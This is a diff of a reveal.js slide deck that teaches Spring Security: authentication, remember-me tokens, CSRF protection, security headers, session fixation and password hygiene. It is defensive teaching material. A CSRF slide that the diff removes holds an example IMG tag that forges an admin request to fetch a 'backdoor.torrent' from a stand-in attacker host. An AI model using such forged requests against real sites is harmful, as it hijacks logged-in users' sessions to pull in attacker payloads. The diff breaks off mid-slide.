@@ -64,11 +64,11 @@
 
 	<body>
 
-    <div class="documentation">
-        <div>
-            <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/" target="_blank">Docs</a>
+        <div class="documentation">
+            <div>
+                <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/" target="_blank">Docs</a>
+            </div>
         </div>
-    </div>
         <div style="display: block; position: absolute; bottom: 40px; left: 50%; margin-left: -70px; z-index: 20;">
             <a href="http://www.fg.cz" target="_blank"><img src="img/jopenspace2013/FG_Forrest_neg.png" width="140px"/></a>
         </div>
@@ -76,6 +76,7 @@
 		<div class="reveal">
 
 			<div class="slides">
+                <!-- INTRO -->
 				<section data-background="img/backgrounds/black.jpg">
 					<h1>Spring Security</h1>
 					<h2>your gate to authentication and authorization</h2>
@@ -134,9 +135,11 @@
                         <li>Spring integration (as you'd expect)</li>
                         <li>mature and widespread (Acegi started in 2003)</li>
                         <li>still in active development</li>
+                        <li>easy extensible</li>
                         <li>well documented and tested</li>
                     </ol>
                 </section>
+                <!-- ARCHITECTURE -->
                 <section data-background="img/backgrounds/brown.jpg">
                     <section data-transition="slide-in fade-out">
                         <h1>Architecture overview</h1>
@@ -205,6 +208,7 @@
                         <p>ConcurrentSessionFilter - tracks presence of all sessions,<br/> SessionManagementFilter - enforces session management</p>
                     </section>
                 </section>
+                <!-- CONFIGURATION -->
                 <section data-background="img/backgrounds/brown.jpg">
                     <h1>Configuration</h1>
                     <p>Both types of configuration are similar one to another.</p>
@@ -222,13 +226,14 @@
                         <em style="font-size: 60%;">(Thanks to <a href="https://plugins.jetbrains.com/plugin/6027">Remote plugin</a>)</em>
                     </div>
                 </section>
+                <!-- AUTHENTICATION -->
                 <section data-background="img/backgrounds/brown.jpg">
-                    <section data-transition="slide-in">
-                        <h1>Authentication process</h1>
-                        <img src="img/spring-security/resources-access.png" alt="Secured resource access" style="max-height: 600px">
+                    <section data-transition="fade-in fade-out">
+                        <section data-transition="slide-in">
+                            <h1>Authentication process</h1>
+                            <img src="img/spring-security/resources-access.png" alt="Secured resource access" style="max-height: 600px">
+                        </section>
                     </section>
-                </section>
-                <section data-background="img/backgrounds/brown.jpg">
                     <section data-transition="fade-in fade-out">
                         <h1>Login</h1>
                         <div>
@@ -299,381 +304,7 @@
                         </div>
                     </section>
                 </section>
-                <section data-background="img/backgrounds/brown.jpg">
-                    <section data-transition="fade-in fade-out">
-                        <h1>Remember me, hot or not?</h1>
-                        <div style="text-align: center">
-                            <img class="plain" src="img/spring-security/remember-me.png" alt="Keep me signed in" style="width: 25%;">
-                        </div>
-                        <div style="float: left; margin-left: 2em;">
-                            <h4>Things to consider</h4>
-                            <ul>
-                                <li>users do like it</li>
-                                <li>when stealed logs anyone in</li>
-                                <li>it opens gap for CSRF attack</li>
-                                <li>it may reveal original password</li>
-                            </ul>
-                        </div>
-                        <div style="margin-left: 2em;">
-                            <h4>2-basic implementations</h4>
-                            <ul>
-                                <li>Hash-Based Token (default)</li>
-                                <li>Persistent Token Approach</li>
-                            </ul>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Remember me, hot or not?</h1>
-                        <div style="float: left; margin-left: 2em;">
-                            <h4>Require interactive login for</h4>
-                            <ul>
-                                <li>password change</li>
-                                <li>email change</li>
-                                <li>access to sensitive information (address)</li>
-                                <li>important actions (purchase)</li>
-                            </ul>
-                        </div>
-                        <div style="margin-left: 2em;">
-                            <h4>Consider</h4>
-                            <ul>
-                                <li>HTTPS over entire site</li>
-                                <li>secure only cookie (explicitly set necessary)</li>
-                                <li>http only cookie (explicitly set necessary)</li>
-                            </ul>
-                        </div>
-                        <div style="clear: both; margin-top: 2em">
-                            <pre>
-<code class="nohighlight" data-trim data-noescape>/userProfile/*=IS_AUTHENTICATED_FULLY
-/login=IS_AUTHENTICATED_ANONYMOUSLY
-/logout=IS_AUTHENTICATED_ANONYMOUSLY
-/lostPassword=IS_AUTHENTICATED_ANONYMOUSLY
-/**=IS_AUTHENTICATED_REMEMBERED</code>
-                            </pre>
-                        </div>
-                        <div>
-                            <a href="http://localhost:8091/?message=org/springframework/security/access/vote/AuthenticatedVoter.java:29">Documentation</a>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Hash-Based Token</h1>
-                        <pre style="display: inline-block">
-<code class="nohighlight" data-trim data-noescape>base64(username + ":" + expirationTime + ":" +
-md5Hex(username + ":" + expirationTime + ":" password + ":" + key))
-
-username:          As identifiable to the UserDetailsService
-password:          That matches the one in the retrieved UserDetails
-expirationTime:    The date and time when the remember-me token expires, expressed in milliseconds
-key:               A private key to prevent modification of the remember-me token</code>
-                        </pre>
-                        <h4>Disadvantages</h4>
-                        <ul>
-                            <li>username + expiration time known to the attacker</li>
-                            <li>password is part of the hash</li>
-                            <li>MD5 cipher is very fast</li>
-                            <li>key is shared among all users</li>
-                        </ul>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Persistent Token Approach</h1>
-                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
-                            <h3>How it works</h3>
-                            <ol>
-                                <li>on successful login with Remember Me checked, a login cookie is issued</li>
-                                <li>cookie consists of <code>series:token</code></li>
-                                <li>the series and token are unguessable random numbers from a suitably large space</li>
-                                <li>data is stored together with user name in a database table</li>
-                                <li>when a non-logged-in user visits the site with a login cookie, it is looked up in the database</li>
-                                <li>if it is present, systems logs in a user with name stored with the pair in db</li>
-                                <li>used token is removed from the database</li>
-                                <li>new token is generated but series part is kept same, data are updated in DB and new cookie is sent to browser</li>
-                                <li>if the username and series are present but the token does not match, a theft is assumed - user receives a warning and all of the user's remembered sessions are deleted</li>
-                                <li>if the username and series are not present, the login cookie is ignored.</li>
-                            </ol>
-                        </div>
-                        <div style="float: left; margin-left: 2em; width: 45%; font-size: 80%;">
-                            <h3>Disadvantages</h3>
-                            <ul style="width: 100%">
-                                <li>CSRF window is still open wide</li>
-                                <li>when stolen it opens up app to the attacker</li>
-                                <li>requires persistent storage</li>
-                                <li>if DB is leaked attackers can login as every user using RM cookie
-                                    (<a href="http://security.stackexchange.com/questions/63435/why-use-an-authentication-token-instead-of-the-username-password-per-request/63438#63438">see this article</a>)</li>
-                            </ul>
-                            <h3 style="margin-top: 1em">Advantages</h3>
-                            <ul style="width: 100%">
-                                <li>user name is not revealed</li>
-                                <li>password is not revealed</li>
-                                <li>when stolen, user gets informed on next login</li>
-                                <li>when stolen, attacker looses access on user next login</li>
-                            </ul>
-                        </div>
-                    </section>
-                </section>
-                <section data-background="img/backgrounds/brown.jpg">
-                    <section data-transition="fade-in fade-out">
-                        <h1>Cross-site request forgery</h1>
-                        <p>Technique that misuses an authenticated relation to execute operations via HTTP calls invisible
-                            to the user using well known URLs and parameters.</p>
-                        <ol>
-                            <li>user logs in to an administration</li>
-                            <li>user opens attacker site (in the same or different tab)</li>
-                            <li>attacker site contains IMG/SCRIPT/STYLE elements that targets administration URL
-                                with appropriate parameters to execute actions</li>
-                        </ol>
-                        <pre><code><img src="http://localhost:8080/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent"></code></pre>
-                        <p><em>HTTP GET method is easiest to hack, other methods require social engeneering or JavaScript to execute. But are not hard to do.</em></p>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>CSRF protection</h1>
-                        <ul>
-                            <li>Referer header check (not entirely recommended)</li>
-                            <li>requesting unique CSRF token in HTTP request (as parameter or header, not cookie!)</li>
-                        </ul>
-                        <p><em style="font-size: 75%">Originally Spring Security used <a href="https://spring.io/blog/2013/08/21/spring-security-3-2-0-rc1-highlights-csrf-protection/">CSRF token per session</a>
-                           but it was quite impractical (browser back button, partial update) and thus CSRF token is now unique to session.</em></p>
-                        <h3>Things to consider</h3>
-                        <ul>
-                            <li>CSRF protection needs to be part of login & logout process</li>
-                            <li>Javascript / AJAX calls might copy contents <code>X-XSRF-TOKEN</code> to HTTP header (attacker won't be able to do this due to <em>same origin policy</em>) ... see
-                                <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/csrf.html#csrf-cookie">CookieCsrfTokenRepository</a></li>
-                            <li>Multipart form posts are harder to protect - entire body must be processed before CSRF protection might apply</li>
-                            <li>CSRF token SHOULD NOT be used in GET requests due to possible token leak via Referer header. CSRF token should be used only in HTTP POST actions that produces protected side effect.</li>
-                        </ul>
-                    </section>
-                </section>
-                <section data-background="img/backgrounds/brown.jpg">
-                    <section data-transition="fade-in fade-out">
-                        <h1>Password management</h1>
-                        <img class="plain" src="img/spring-security/password.jpg" alt="Password" style="width: 30%; float: left">
-                        <div style="text-align: left; float: left; margin-left: 2em; width: 65%; font-size: 80%;">
-                            <h3>Hygienic rules to follow:</h3>
-                            <ul>
-                                <li>Use slow hashing function with unique salt per user (Spring Security default is Bcrypt)</li>
-                                <li>Don't send passwords in e-mails.</li>
-                                <li>Require strong passwords from users.</li>
-                                <li>Send passwords only over SSL.</li>
-                                <li>When user changes his password / email require entering his current password.</li>
-                                <li>Do not load users with passwords (hashes) into memory.</li>
-                            </ul>
-                            <h3 style="margin-top: 1em">Spring Security helps you with</h3>
-                            <ul>
-                                <li>hashing passwords</li>
-                                <li>enforcing SSL</li>
-                                <li>clearing pwd from logged in user object</li>
-                            </ul>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Lost password facility</h1>
-                        <h3>Hygienic rules to follow:</h3>
-                        <img class="plain" src="img/spring-security/reset.png" alt="Reset password" style="width: 30%; float: left">
-                        <div style="float: left; margin-left: 2em; width: 65%; font-size: 80%;">
-                            <ul>
-                                <li>If a user forgets their password, send them a secure one-time reset link, using a randomly generated reset token stored in the database. The token must be unique and secret, so hash the token in the database and compare it when the link is used.</li>
-                                <li>Enforce that a token can only be used to reset the password of the user who requested it.</li>
-                                <li>Store token in database only in a "hashed" version.</li>
-                                <li>Once the token is used, it must be deleted from the database and must not be allowed to be used again.</li>
-                                <li>Have all password-equivilent tokens, including reset tokens, expire after a short time, e.g. 48 hours. This prevents an attacker exploiting unused tokens at a later date.</li>
-                                <li>Immediately display a form to allow the user to set a new password. Do not use temporary random generated passwords!</li>
-                                <li>Do not use "secret questions".</li>
-                            </ul>
-                        </div>
-                    </section>
-                </section>
-                <section data-background="img/backgrounds/brown.jpg">
-                    <h1>Channel security</h1>
-                    <img class="plain" src="img/spring-security/ssl.png" alt="Password" style="width: 25%; float: left">
-                    <div style="text-align: left; float: left; margin-left: 2em; width: 65%; font-size: 80%;">
-                        <p>Allows you setup simple rules for SSL / plain HTTP protocol enforcement.</p>
-<pre style="display: inline-block;"><code class="xml" data-trim><http>
-    <intercept-url pattern="/secure/**" requires-channel="https"></intercept-url>
-    <intercept-url pattern="/css/**" requires-channel="http"></intercept-url>
-    <intercept-url pattern="/**" requires-channel="any"></intercept-url>
-    <port-mappings>
-        <port-mapping http="9080" https="9443"></port-mapping>
-    </port-mappings>
-</http></code></pre>
-                        <div style="text-align: center">
-                            <p>You don't have any excuse not to encrypt.</p>
-                            <a href="https://letsencrypt.org/">
-                                <img class="plain" src="img/spring-security/lets-encrypt.png" alt="Let's Encrypt" style="width: 50%">
-                            </a>
-                        </div>
-                    </div>
-                </section>
-                <section data-background="img/spring-security/security_header.jpg" data-background-color="black" data-background-size="30%" data-background-position="left">
-                    <section data-transition="fade-in fade-out">
-                        <h1>Security headers</h1>
-                        <div style="text-align: left; margin-left: 8em;">
-                            <p>These are defaults:</p>
-<pre style="display: inline-block;"><code class="xml" data-trim>
-Cache-Control: no-cache, no-store, max-age=0, must-revalidate
-Pragma: no-cache
-Expires: 0
-X-Content-Type-Options: nosniff
-Strict-Transport-Security: max-age=31536000 ; includeSubDomains
-X-Frame-Options: DENY
-X-XSS-Protection: 1; mode=block</code></pre>
-                            <p>By only declaring:</p>
-<pre style="display: inline-block;"><code class="xml" data-trim><http>
-	<headers defaults-disable="false"></headers>
-</http></code></pre>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>X-Content-Type-Options</h1>
-                        <div style="text-align: left; margin-left: 8em;">
-                            <p>Header example:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>X-Content-Type-Options: nosniff</code></pre>
-                            <p>Tells browsers (Chrome,IE) not to guess content type of the document from it's content.</p>
-                            <p>Attack scenario: malicious user uploads PDF file that contains JavaScript. Your server
-                               let other users to download such file and open it in their browser. Even if server supplies
-                               PDF content type, browser might decide not to trust it and detect content type by the contents of the
-                               file. Finally it handles PDF file as JavaScript one and executes the script.</p>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>HTTP Strict Transport Security (HSTS)</h1>
-                        <div style="text-align: left; margin-left: 8em;">
-                            <p>Header example:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>Strict-Transport-Security: max-age=31536000 ; includeSubDomains</code></pre>
-                            <p>Tells browser that all resources on this domain must be reached by HTTPS protocol.</p>
-                            <p>Except first request all subsequent ones will be loaded over HTTPS by the browser. Even if there is explicit link with HTTP protocol.</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim><img src="http://myserver.cz/img/someimage.jpg"></code></pre>
-                            <p>First request problem can be solved with <a href="https://hstspreload.appspot.com/">HSTS Preload</a></p>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>HTTP Public Key Pinning (HPKP)</h1>
-                        <div style="text-align: left; margin-left: 8em;">
-                            <p>Header example:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>Public-Key-Pins-Report-Only: max-age=5184000;
-                             pin-sha256="d6qzRu9zOECb90Uez27xWltNsj0e1Md7GkYYkVoZWmM=";
-                             pin-sha256="E9CZ9INDbd+2eRQozYqqbQ2yXLVKB9+xcprMF+44U1g=";
-                             report-uri="http://example.net/pkp-report";
-                             includeSubDomains</code></pre>
-                            <p>Tells browser that public key in the server certificate must match any of presented SHA256 hashes. Protects you against compromised CA.</p>
-                            <p>Trust on First Use.</p>
-                            <p>When using <code style="font-size: 80%">Public-Key-Pins</code> and the server delivers an unknown public key, the client should present a warning to the user.</p>
-                            <p>Reports can be processed with <a href="https://report-uri.io/">Report URI service</a></p>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>X-Frame-Options</h1>
-                        <div style="text-align: left; margin-left: 8em;">
-                            <p>Header example:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>X-Frame-Options: deny</code></pre>
-                            <p>Tells browser not to load any FRAMES on your domain (or only frames targeting your/some domain).</p>
-                            <p>Standardized as part of Content Security Policy.</p>
-                            <p>Alternative variants:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>X-Frame-Options: deny
-X-Frame-Options: sameorigin
-X-Frame-Options: allow-from www.seznam.cz</code></pre>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>X-XSS-Protection</h1>
-                        <div style="text-align: left; margin-left: 8em;">
-                            <p>Header example:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>X-XSS-Protection: 1; mode=block</code></pre>
-                            <p>Ask browser to assist you with reflected XSS attack.</p>
-                            <p>If browser <a href="https://blogs.msdn.microsoft.com/ie/2008/07/02/ie8-security-part-iv-the-xss-filter/">detects suspicious script</a> in request that is reflected in the server response, script is blocked or reported.</p>
-                            <p>Alternative variant:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>X-XSS-Protection: 1;  report=https://report-uri.io/</code></pre>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Content Security Policy (CSP)</h1>
-                        <div style="text-align: left; margin-left: 8em; height: 800px;">
-                            <p>Header example:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>Content-Security-Policy: script-src 'self' https://trustedscripts.example.com;
-                         report-uri /csp-report-endpoint/</code></pre>
-                            <p>Site tels browser from which sources it expects to load resources.</p>
-                            <p>Documentation at <a href="https://content-security-policy.com/">https://content-security-policy.com</a></p>
-                            <p>Alternative variant:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>Content-Security-Policy-Report-Only: script-src 'self';
-                                     report-uri /csp-report-endpoint/</code></pre>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Content Security Policy (CSP)</h1>
-                        <div style="text-align: left; margin-left: 8em; height: 800px;">
-                            <img src="img/spring-security/csp.png" alt="CSP overview">
-                        </div>
-                    </section>
-                </section>
-                <section data-background="img/backgrounds/binary-code.jpg">
-                    <section data-transition="fade-in fade-out">
-                        <h1>Session management</h1>
-                        <p>After successfull authentication all registered
-                            <a href="http://localhost:8091/?message=org/springframework/security/web/authentication/session/SessionAuthenticationStrategy.java">SessionAuthenticationStrategy</a>
-                            are called.<br/>Preprogrammed implementations provide:
-                        </p>
-                        <ul>
-                            <li>session fixation protection</li>
-                            <li>concurrency control</li>
-                        </ul>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Session fixation protection</h1>
-                        <p><strong>Attack vector:</strong> Attacker will create it's own session in the application.
-                            Via social engineering sends link to a user (or uses similar technique) that will make user
-                            browser to use already existing attacker session. When user logs in, attacker can act on
-                            behalf of the user.
-                        </p>
-                        <h3>Defense</h3>
-                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
-                            <p>Don't accept session id from URL by configuring web.xml:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim><session-config>
-    <tracking-mode>COOKIE</tracking-mode>
-</session-config></code></pre>
-                            <ul style="font-size: 70%">
-                                <li>COOKIE</li>
-                                <li>URL</li>
-                                <li>
-                                    <a href="http://download.oracle.com/otn-pub/jcp/servlet-3.0-fr-eval-oth-JSpec/servlet-3_0-final-spec.pdf?AuthParam=1471606619_c6d486d96c4d3110d045d7027578a40e">SSL</a> (chapter 7.1.2)</li>
-                            </ul>
-                        </div>
-                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
-                            <p>Create new session on user login:</p>
-                            <pre style="display: inline-block;"><code class="xml" data-trim>&lt;session-management session-fixation-protection="migrateSession"/&gt;</code></pre>
-                            <ul style="font-size: 70%">
-                                <li>newSession (clean)</li>
-                                <li>migrateSession (copy)</li>
-                                <li>changeSessionId (Servlet 3.1)</li>
-                            </ul>
-                        </div>
-                    </section>
-                    <section data-transition="fade-in fade-out">
-                        <h1>Concurrency control</h1>
-                        <p>Spring Security can track all sessions in <a href="http://localhost:8091/?message=org/springframework/security/core/session/SessionRegistry.java">SessionRegistry</a>.</p>
-                        <pre style="display: inline-block;"><code class="xml" data-trim><session-management>
-    &lt;concurrency-control max-sessions="1" error-if-maximum-exceeded="true"/&gt;  expired-url="/sessionExpired.html"
-</session-management></code></pre>
-                        <p>When <em>error-if-maximum-exceeded</em> is false and <em>max-sessions</em> is exceeded least recently used session is invalidated.
-                           User using this session will get <em>expired-url</em> page.</p>
-                    </section>
-                </section>
-                <section data-background="img/backgrounds/brown.jpg">
-                    <h1>User switching</h1>
-                    <img src="img/spring-security/user-switch.png" alt="CSP overview" class="plain" width="200" style="float: left;">
-                    <div style="float: left; margin-left: 2em; width: 65%; font-size: 80%;">
-                        <p>Handy for developers as well as for customer administrators. Allows user with admin roles to switch
-                           to any other user with lower roles without knowing password.</p>
-<pre style="display: inline-block;"><code class="java" data-trim>@Override
-protected void configure(HttpSecurity http) throws Exception {
-    final SwitchUserFilter filter = new SwitchUserFilter();
-    filter.setSwitchUserUrl("/switchUser");
-    filter.setUsernameParameter("username");
-    filter.setExitUserUrl("/restoreUserBack");
-    http.addFilterAfter(filter, FilterSecurityInterceptor.class)
-        .authorizeRequests()
-            .antMatchers("/switchUser").hasAnyAuthority("ROLE_ADMIN")
-            .antMatchers("/restoreUser").authenticated();
-}</code></pre>
-                        <p>Consider also adding an IP check or other authentication checks to better secure user switching.<br/>This feature is form of backdoor.</p>
-                    </div>
-                </section>
+                <!-- AUTHORIZATION -->
                 <section data-background="img/spring-security/authorization.jpg" data-background-size="30%" data-background-color="black" data-background-position="left">
                     <section data-transition="fade-in fade-out">
                         <h1>Authorization</h1>
@@ -696,7 +327,7 @@ protected void configure(HttpSecurity http) throws Exception {
                         </div>
                         <div style="clear: both; width: 85%; float: right;">
                             <strong>Example:</strong>
-<pre style="display: inline-block;"><code class="xml" data-trim>/admin/**=ROLE_ADMINISTRATOR, ROLE_SUPER_ADMINISTRATOR
+                            <pre style="display: inline-block;"><code class="xml" data-trim>/admin/**=ROLE_ADMINISTRATOR, ROLE_SUPER_ADMINISTRATOR
 /**=IS_AUTHENTICATED_ANONYMOUSLY
 
 /userManagement/**=#{hasRole('ROLE_COMPANY_OWNER') and hasIpAddress('192.168.1.0/24')</code></pre>
@@ -724,7 +355,7 @@ ROLE_USER > ROLE_GUEST</code></pre>
                    access="@webSecurity.checkUserId(authentication,#userId)"/&gt;
 &lt;/http&gt;</code></pre>
                             <p>@ refers to Spring bean objects<br/>
-                               # refers to url parameters</p>
+                                # refers to url parameters</p>
                         </div>
                     </section>
                     <section data-transition="fade-in fade-out">
@@ -735,7 +366,7 @@ ROLE_USER > ROLE_GUEST</code></pre>
                         <h1>Method security</h1>
                         <p>Operates using Spring AOP abstraction.<br/>Thus you can configure it manually by custom Aspects or exact mapping.</p>
                         <h3>Expression based security</h3>
-                        <div style="width: 35%; margin-left: 10%; float: left;">
+                        <div style="width: 25%; margin-left: 15%; float: left;">
                             <p>Method annotations:</p>
                             <ul style="list-style-type: none">
                                 <li>@PreAuthorize</li>
@@ -744,7 +375,7 @@ ROLE_USER > ROLE_GUEST</code></pre>
                                 <li>@PostFilter</li>
                             </ul>
                         </div>
-                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
+                        <div style="float: left; width: 55%; font-size: 100%; margin-left: 2em;">
                             <p>
                             <pre style="display: inline-block;"><code class="java" data-trim>@PreAuthorize("#contact.name == authentication.name")
 public void doSomething(Contact contact);
@@ -754,7 +385,7 @@ public void doSomething(Contact contact);
 public List&lt;Contact&gt; getAll();</code></pre>
                             </p>
                             <p>Filtering is not suitable for paged output.<br/>
-                               But Spring Security can <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/data-query.html">integrate with Spring Data</a>!</p>
+                                But Spring Security can <a href="http://docs.spring.io/spring-security/site/docs/4.2.x-SNAPSHOT/reference/html/data-query.html">integrate with Spring Data</a>!</p>
                         </div>
                     </section>
                     <section data-transition="fade-in fade-out">
@@ -773,6 +404,7 @@ public void doSomething(Contact contact);</code></pre>
                         <p style="margin-left: 20%; text-align: center"><em>Currently doesn't allow multiple annotations on a single method. <a href="https://github.com/spring-projects/spring-security/issues/4003">Issue #4003</a></em></p>
                     </section>
                 </section>
+                <!-- TESTING -->
                 <section data-background="img/spring-security/testing.png">
                     <section data-transition="fade-in fade-out">
                         <h1>Security testing</h1>
@@ -887,13 +519,397 @@ public class ExampleTestClass {
                         </div>
                     </section>
                 </section>
+                <!-- PASSWORD MANAGEMENT -->
+                <section data-background="img/backgrounds/brown.jpg">
+                    <section data-transition="fade-in fade-out">
+                        <h1>Password management</h1>
+                        <img class="plain" src="img/spring-security/password.jpg" alt="Password" style="width: 30%; float: left">
+                        <div style="text-align: left; float: left; margin-left: 2em; width: 65%; font-size: 80%;">
+                            <h3>Hygienic rules to follow:</h3>
+                            <ul>
+                                <li>Use slow hashing function with unique salt per user (Spring Security default is Bcrypt)</li>
+                                <li>Don't send passwords in e-mails.</li>
+                                <li>Require strong passwords from users.</li>
+                                <li>Send login credentials only over SSL.</li>
+                                <li>When user changes his password / email require entering his current password.</li>
+                                <li>Do not load users with passwords (hashes) into memory.</li>
+                            </ul>
+                            <h3 style="margin-top: 1em">Spring Security helps you with</h3>
+                            <ul>
+                                <li>hashing passwords</li>
+                                <li>enforcing SSL</li>
+                                <li>clearing pwd from logged in user object</li>
+                            </ul>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Lost password facility</h1>
+                        <h3>Hygienic rules to follow:</h3>
+                        <img class="plain" src="img/spring-security/reset.png" alt="Reset password" style="width: 30%; float: left">
+                        <div style="float: left; margin-left: 2em; width: 65%; font-size: 80%;">
+                            <ul>
+                                <li>If a user forgets their password, send them a secure one-time reset link, using a randomly generated reset token stored in the database. The token must be unique and secret, so hash the token in the database and compare it when the link is used.</li>
+                                <li>Do have same response when user exists as well as if he does not.</li>
+                                <li>Enforce that a token can only be used to reset the password of the user who requested it.</li>
+                                <li>Store token in database only in a "hashed" version.</li>
+                                <li>Once the token is used, it must be deleted from the database and must not be allowed to be used again.</li>
+                                <li>Have all password-equivilent tokens, including reset tokens, expire after a short time, e.g. 48 hours. This prevents an attacker exploiting unused tokens at a later date.</li>
+                                <li>Immediately display a form to allow the user to set a new password. Do not use temporary random generated passwords!</li>
+                                <li>Do not use "secret questions".</li>
+                            </ul>
+                        </div>
+                    </section>
+                </section>
+                <!-- REMEMBER ME -->
+                <section data-background="img/backgrounds/brown.jpg">
+                    <section data-transition="fade-in fade-out">
+                        <h1>Remember me, hot or not?</h1>
+                        <div style="text-align: center">
+                            <img class="plain" src="img/spring-security/remember-me.png" alt="Keep me signed in" style="width: 25%;">
+                        </div>
+                        <div style="float: left; margin-left: 2em;">
+                            <h4>Things to consider</h4>
+                            <ul>
+                                <li>users do like it</li>
+                                <li>when stealed logs anyone in</li>
+                                <li>it opens gap for CSRF attack</li>
+                                <li>it may reveal original password</li>
+                            </ul>
+                        </div>
+                        <div style="margin-left: 2em;">
+                            <h4>2-basic implementations</h4>
+                            <ul>
+                                <li>Hash-Based Token (default)</li>
+                                <li>Persistent Token Approach</li>
+                            </ul>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Remember me, hot or not?</h1>
+                        <div style="float: left; margin-left: 2em;">
+                            <h4>Require interactive login for</h4>
+                            <ul>
+                                <li>password change</li>
+                                <li>email change</li>
+                                <li>access to sensitive information (address)</li>
+                                <li>important actions (purchase)</li>
+                            </ul>
+                        </div>
+                        <div style="margin-left: 2em;">
+                            <h4>Consider</h4>
+                            <ul>
+                                <li>HTTPS over entire site</li>
+                                <li>secure only cookie (explicitly set necessary)</li>
+                                <li>http only cookie (explicitly set necessary)</li>
+                            </ul>
+                        </div>
+                        <div style="clear: both; margin-top: 2em">
+                            <pre>
+<code class="nohighlight" data-trim data-noescape>/userProfile/*=IS_AUTHENTICATED_FULLY
+/login=IS_AUTHENTICATED_ANONYMOUSLY
+/logout=IS_AUTHENTICATED_ANONYMOUSLY
+/lostPassword=IS_AUTHENTICATED_ANONYMOUSLY
+/**=IS_AUTHENTICATED_REMEMBERED</code>
+                            </pre>
+                        </div>
+                        <div>
+                            <a href="http://localhost:8091/?message=org/springframework/security/access/vote/AuthenticatedVoter.java:29">Documentation</a>
+                        </div>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Hash-Based Token</h1>
+                        <pre style="display: inline-block">
+<code class="nohighlight" data-trim data-noescape>base64(username + ":" + expirationTime + ":" +
+md5Hex(username + ":" + expirationTime + ":" password + ":" + key))
+
+username:          As identifiable to the UserDetailsService
+password:          That matches the one in the retrieved UserDetails
+expirationTime:    The date and time when the remember-me token expires, expressed in milliseconds
+key:               A private key to prevent modification of the remember-me token</code>
+                        </pre>
+                        <h4>Disadvantages</h4>
+                        <ul>
+                            <li>username + expiration time known to the attacker</li>
+                            <li>password is part of the hash</li>
+                            <li>MD5 cipher is very fast</li>
+                            <li>key is shared among all users</li>
+                        </ul>
+                    </section>
+                    <section data-transition="fade-in fade-out">
+                        <h1>Persistent Token Approach</h1>
+                        <div style="float: left; width: 45%; font-size: 80%; margin-left: 2em;">
+                            <h3>How it works</h3>
+                            <ol>
+                                <li>on successful login with Remember Me checked, a login cookie is issued</li>
+                                <li>cookie consists of <code>series:token</code></li>
+                                <li>the series and token are unguessable random numbers from a suitably large space</li>
+                                <li>data is stored together with user name in a database table</li>
+                                <li>when a non-logged-in user visits the site with a login cookie, it is looked up in the database</li>
+                                <li>if it is present, systems logs in a user with name stored with the pair in db</li>
+                                <li>used token is removed from the database</li>
+                                <li>new token is generated but series part is kept same, data are updated in DB and new cookie is sent to browser</li>
+                                <li>if the username and series are present but the token does not match, a theft is assumed - user receives a warning and all of the user's remembered sessions are deleted</li>
+                                <li>if the username and series are not present, the login cookie is ignored.</li>
+                            </ol>
+                        </div>
+                        <div style="float: left; margin-left: 2em; width: 45%; font-size: 80%;">
+                            <h3>Disadvantages</h3>
+                            <ul style="width: 100%">
+                                <li>CSRF window is still open wide</li>
+                                <li>when stolen it opens up app to the attacker</li>
+                                <li>requires persistent storage</li>
+                                <li>if DB is leaked attackers can login as every user using RM cookie
+                                    (<a href="http://security.stackexchange.com/questions/63435/why-use-an-authentication-token-instead-of-the-username-password-per-request/63438#63438">see this article</a>)</li>
+                            </ul>
+                            <h3 style="margin-top: 1em">Advantages</h3>
+                            <ul style="width: 100%">
+                                <li>user name is not revealed</li>
+                                <li>password is not revealed</li>
+                                <li>when stolen, user gets informed on next login</li>
+                                <li>when stolen, attacker looses access on user next login</li>
+                            </ul>
+                        </div>
+                    </section>
+                </section>
+                <!-- CSRF -->
+                <section data-background="img/backgrounds/brown.jpg">
+                    <section data-transition="fade-in fade-out">
+                        <h1>Cross-site request forgery</h1>
+                        <p>Technique that misuses an authenticated relation to execute operations via HTTP calls invisible
+                            to the user using well known URLs and parameters.</p>
+                        <ol>
+                            <li>user logs in to an administration</li>
+                            <li>user opens attacker site (in the same or different tab)</li>
+                            <li>attacker site contains IMG/SCRIPT/STYLE elements that targets administration URL
+                                with appropriate parameters to execute actions</li>
+                        </ol>
